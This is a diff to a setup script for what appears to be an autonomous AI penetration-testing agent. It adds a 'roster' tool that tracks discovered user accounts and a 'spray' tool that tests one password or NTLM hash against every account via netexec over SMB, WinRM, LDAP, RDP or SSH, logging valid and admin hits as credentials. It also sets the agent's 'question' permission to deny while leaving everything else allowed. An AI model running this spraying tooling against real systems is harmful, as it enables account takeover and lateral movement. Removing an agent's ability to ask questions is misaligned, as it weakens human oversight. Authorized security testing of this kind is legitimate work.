@@ -565,6 +565,11 @@ def main():
 
     sync("service", svc_lines)
     sync("cred", board_creds)
+
+    # Feed every username MSF knows into the account roster (deduped there).
+    usernames = sorted({row["username"] for row, _ in creds.values() if row["username"]})
+    if usernames:
+        subprocess.run(["roster", "add", *usernames], capture_output=True, text=True)
     print(f"[*] {len(hosts)} hosts, {len(services)} services, {len(creds)} creds in MSF; "
           f"skipped {skipped_rpc} dynamic-RPC ports and {skipped_dup} already on the board. "
           f"Everything is in notes/msf.md")
@@ -1135,6 +1140,287 @@ if __name__ == "__main__":
     sys.exit(main(sys.argv[1:]))
 EXPORTEOF
 
+# --- Account roster: the list of discovered identities and which have been
+#     tested. qwen fixates on its first identity; this makes "who haven't I
+#     tried yet" a thing it can see and `spray` act on.
+cat << 'ROSTEREOF' > /usr/local/bin/roster
+#!/usr/bin/env python3
+"""roster -- track every discovered account and whether it's been tested.
+
+  roster add <user> [<user>...]     record discovered accounts (stdin lines ok)
+  roster rm <user> [<user>...]      remove junk entries (typos, group names)
+  roster show                       tested vs untested
+  roster untested                   print untested accounts, one per line
+  roster tested <user> [result...]  mark an account tested (with a note)
+
+Usernames are stored bare (DOMAIN\\user and user@dom collapse to the SAM name),
+deduped case-insensitively. Every identity is new attack surface -- when you get
+a new password or hash, `spray` it across this roster.
+"""
+import datetime
+import fcntl
+import os
+import re
+import select
+import sys
+
+ROSTER = "/workspace/notes/roster.md"
+LOCK = "/tmp/.roster.lock"
+
+
+def die(msg, code=2):
+    print(msg, file=sys.stderr)
+    sys.exit(code)
+
+
+def bare(u):
+    u = u.strip().strip('"').strip("'")
+    if "\\" in u:
+        u = u.rsplit("\\", 1)[1]
+    if "@" in u:
+        u = u.split("@", 1)[0]
+    return u.strip()
+
+
+def stdin_tokens():
+    try:
+        if sys.stdin.isatty() or not select.select([sys.stdin], [], [], 0.5)[0]:
+            return []
+        return sys.stdin.read().split()
+    except (AttributeError, OSError, ValueError):
+        return []
+
+
+def load():
+    """-> dict keyed by lowercased name: {'name':display, 'tested':bool, 'note':str}"""
+    out = {}
+    try:
+        with open(ROSTER, encoding="utf-8", errors="replace") as f:
+            for line in f:
+                m = re.match(r"- \[([ xX])\] (\S+)(?: -- (.*))?$", line.rstrip())
+                if m:
+                    out[m.group(2).lower()] = {"name": m.group(2),
+                                               "tested": m.group(1).lower() == "x",
+                                               "note": (m.group(3) or "").strip()}
+    except FileNotFoundError:
+        pass
+    return out
+
+
+def save(entries):
+    os.makedirs(os.path.dirname(ROSTER), exist_ok=True)
+    rows = sorted(entries.values(), key=lambda e: (e["tested"], e["name"].lower()))
+    body = [f"# Account roster", f"_Updated: {datetime.datetime.now():%Y-%m-%d %H:%M:%S}_",
+            "> Every discovered identity. `spray` a new secret across the untested ones.", ""]
+    for e in rows:
+        box = "x" if e["tested"] else " "
+        body.append(f"- [{box}] {e['name']}" + (f" -- {e['note']}" if e["note"] else ""))
+    tmp = f"{ROSTER}.tmp"
+    with open(tmp, "w", encoding="utf-8") as f:
+        f.write("\n".join(body) + "\n")
+    os.replace(tmp, ROSTER)
+
+
+def main(argv):
+    if not argv or argv[0] in ("-h", "--help", "help"):
+        print(__doc__.strip())
+        return 0 if argv else 2
+    cmd, rest = argv[0], argv[1:]
+    with open(LOCK, "w") as lock:
+        fcntl.flock(lock, fcntl.LOCK_EX)
+        entries = load()
+
+        if cmd == "add":
+            names = [bare(x) for x in (rest or stdin_tokens())]
+            names = [n for n in names if n]
+            if not names:
+                die("usage: roster add <user> [<user>...]")
+            added = []
+            for n in names:
+                if n.lower() not in entries:
+                    entries[n.lower()] = {"name": n, "tested": False, "note": ""}
+                    added.append(n)
+            save(entries)
+            print(f"[+] roster +{len(added)}: {', '.join(added) or '(all already known)'} "
+                  f"({sum(not e['tested'] for e in entries.values())} untested of {len(entries)})")
+            return 0
+
+        if cmd == "rm":
+            names = [bare(x) for x in (rest or stdin_tokens())]
+            names = [n for n in names if n]
+            if not names:
+                die("usage: roster rm <user> [<user>...]")
+            removed = []
+            for n in names:
+                key = n.lower()
+                if key in entries:
+                    removed.append(entries[key]["name"])
+                    del entries[key]
+            save(entries)
+            print(f"[-] roster -{len(removed)}: {', '.join(removed) or '(none found)'} "
+                  f"({len(entries)} remaining)")
+            return 0
+
+        if cmd == "tested":
+            if not rest:
+                die("usage: roster tested <user> [result...]")
+            key = bare(rest[0]).lower()
+            if key not in entries:
+                entries[key] = {"name": bare(rest[0]), "tested": False, "note": ""}
+            entries[key]["tested"] = True
+            if rest[1:]:
+                entries[key]["note"] = " ".join(rest[1:])
+            save(entries)
+            print(f"[+] marked tested: {entries[key]['name']}")
+            return 0
+
+        if cmd in ("show", "list", "untested"):
+            untested = [e["name"] for e in entries.values() if not e["tested"]]
+            tested = [e["name"] for e in entries.values() if e["tested"]]
+            if cmd == "untested":
+                print("\n".join(sorted(untested, key=str.lower)))
+                return 0
+            if not entries:
+                print("(roster empty -- 'roster add <user>...' or run note-from-msf / enumerate users)")
+                return 0
+            print(f"untested ({len(untested)}): {', '.join(sorted(untested, key=str.lower)) or '-'}")
+            print(f"tested   ({len(tested)}): {', '.join(sorted(tested, key=str.lower)) or '-'}")
+            if untested:
+                print(f"[!] {len(untested)} identities never tested -- spray a known secret across them.")
+            return 0
+
+    die(f"[-] unknown command '{cmd}'. commands: add rm show untested tested")
+
+
+if __name__ == "__main__":
+    sys.exit(main(sys.argv[1:]))
+ROSTEREOF
+
+# --- Credential spray: test ONE secret against ALL roster accounts in a single
+#     nxc call, record hits, mark each account tested. Mechanizes the step qwen
+#     keeps skipping ("test reuse across every identity").
+cat << 'SPRAYEOF' > /usr/local/bin/spray
+#!/usr/bin/env python3
+"""spray -- test one secret against every account in the roster.
+
+  spray <target> <secret> [proto]      proto = smb (default) | winrm | ldap | rdp | ssh
+
+<secret> is a password, or an NTLM hash (32 hex, or LM:NT) -- auto-detected.
+Testing one secret across many users is one attempt per account, so it does NOT
+risk lockout the way repeated guesses against one account do. Valid hits are
+recorded with `note cred` and every sprayed account is marked tested in roster.
+"""
+import os
+import re
+import subprocess
+import sys
+
+LOGDIR = "/workspace/loot/logs"
+
+
+def die(msg, code=2):
+    print(msg, file=sys.stderr)
+    sys.exit(code)
+
+
+def roster_untested_and_all():
+    out = subprocess.run(["roster", "show"], capture_output=True, text=True)
+    allu = subprocess.run(["roster", "untested"], capture_output=True, text=True)
+    # Spray tests ALL known users (a fresh secret is worth trying on everyone),
+    # so read the full roster file rather than only untested.
+    names = []
+    try:
+        with open("/workspace/notes/roster.md", encoding="utf-8", errors="replace") as f:
+            for line in f:
+                m = re.match(r"- \[[ xX]\] (\S+)", line.rstrip())
+                if m:
+                    names.append(m.group(1))
+    except FileNotFoundError:
+        pass
+    return names
+
+
+def is_hash(secret):
+    return bool(re.fullmatch(r"[0-9a-fA-F]{32}", secret) or
+                re.fullmatch(r"[0-9a-fA-F]{32}:[0-9a-fA-F]{32}", secret) or
+                re.fullmatch(r"aad3b435b51404eeaad3b435b51404ee:[0-9a-fA-F]{32}", secret))
+
+
+def main(argv):
+    if not argv or argv[0] in ("-h", "--help"):
+        print(__doc__.strip())
+        return 0 if argv else 2
+    if len(argv) < 2:
+        die("usage: spray <target> <secret> [proto]")
+    target, secret = argv[0], argv[1]
+    proto = (argv[2] if len(argv) > 2 else "smb").lower()
+    if proto not in ("smb", "winrm", "ldap", "rdp", "ssh"):
+        die(f"[-] proto must be smb|winrm|ldap|rdp|ssh, not '{proto}'")
+
+    users = roster_untested_and_all()
+    if not users:
+        die("[-] roster is empty. Add accounts first: roster add <user>... (or run note-from-msf)")
+
+    os.makedirs(LOGDIR, exist_ok=True)
+    userfile = f"{LOGDIR}/spray-users.txt"
+    with open(userfile, "w", encoding="utf-8") as f:
+        f.write("\n".join(users) + "\n")
+
+    cred_flag = "-H" if is_hash(secret) else "-p"
+    cmd = ["nxc", proto, target, "-u", userfile, cred_flag, secret, "--continue-on-success"]
+    print(f"[*] {' '.join(cmd[:-1])} <secret> ({len(users)} accounts, {cred_flag})", file=sys.stderr)
+    try:
+        r = subprocess.run(cmd, capture_output=True, text=True, timeout=600,
+                           env={**os.environ, "NO_COLOR": "1", "TERM": "dumb"})
+    except FileNotFoundError:
+        die("[-] netexec (nxc) not found on PATH.")
+    except subprocess.TimeoutExpired:
+        die("[-] spray timed out after 600s.")
+    raw = re.sub(r"\x1b\[[0-9;]*[A-Za-z]", "", (r.stdout or "") + (r.stderr or ""))
+    log = f"{LOGDIR}/spray-{proto}-{target.replace('/', '_')}.log"
+    with open(log, "w", encoding="utf-8") as f:
+        f.write(" ".join(cmd) + "\n\n" + raw)
+
+    valid, invalid = {}, []
+    for line in raw.splitlines():
+        m = re.search(r"\[([+\-])\]\s+(\S+)", line)
+        if not m:
+            continue
+        blob = m.group(2)
+        if ":" not in blob:
+            continue
+        user = blob.split(":", 1)[0].split("\\")[-1]
+        if m.group(1) == "+":
+            valid[user] = "admin" if re.search(r"Pwn3d|\(admin\)", line, re.I) else "valid"
+        else:
+            invalid.append(user)
+
+    for user in users:
+        key = user.split("\\")[-1].split("@")[0]
+        hit = valid.get(key) or valid.get(user)
+        result = f"{proto}: {hit}" if hit else f"{proto}: no"
+        subprocess.run(["roster", "tested", user, f"spray {target} -> {result}"],
+                       capture_output=True, text=True)
+        if hit:
+            label = f"valid on {target} {proto}" + (" (admin!)" if hit == "admin" else "")
+            subprocess.run(["note", "cred", f"{user} : {secret} -- {label} (spray)"],
+                           capture_output=True, text=True)
+
+    print(f"\n=== spray {proto}://{target} ===")
+    if valid:
+        for u, lvl in sorted(valid.items()):
+            print(f"  [+] {u:20} {proto} {'ADMIN' if lvl == 'admin' else 'valid'}")
+        print(f"[+] {len(valid)} hit(s) recorded with note cred. Use them: each is new attack surface.")
+    else:
+        print("  (no valid logins)")
+    print(f"[*] {len(users)} accounts tested, {len(invalid)} invalid. Full log: {log.removeprefix('/workspace/')}")
+    return 0
+
+
+if __name__ == "__main__":
+    sys.exit(main(sys.argv[1:]))
+SPRAYEOF
+
 # --- Stateless Metasploit wrapper
 cat << 'EOF' > /usr/local/bin/msf-run
 #!/usr/bin/env bash
@@ -1550,6 +1836,7 @@ echo "$RESPONSE" | jq --arg sel "$SELECTED_MODEL" --arg base "$HALOGEN_URL" '{
   "permission": {
     "*": "allow",
     "external_directory": "allow",
+    "question": "deny",
     "doom_loop": "ask"
   },
   "tool_output": {
@@ -1628,6 +1915,7 @@ chmod +x /usr/local/bin/safe-run /usr/local/bin/scope_check \
          /usr/local/bin/run_guarded /usr/local/bin/msf-run \
          /usr/local/bin/note /usr/local/bin/assess /usr/local/bin/note-from-msf \
          /usr/local/bin/wiki /usr/local/bin/lesson /usr/local/bin/export-session \
+         /usr/local/bin/roster /usr/local/bin/spray \
          /usr/local/bin/msf-mcp /usr/local/bin/opencode-select \
          /usr/local/bin/cleanup \
          /usr/local/bin/rdp-connect /usr/local/bin/rdp-screenshot \
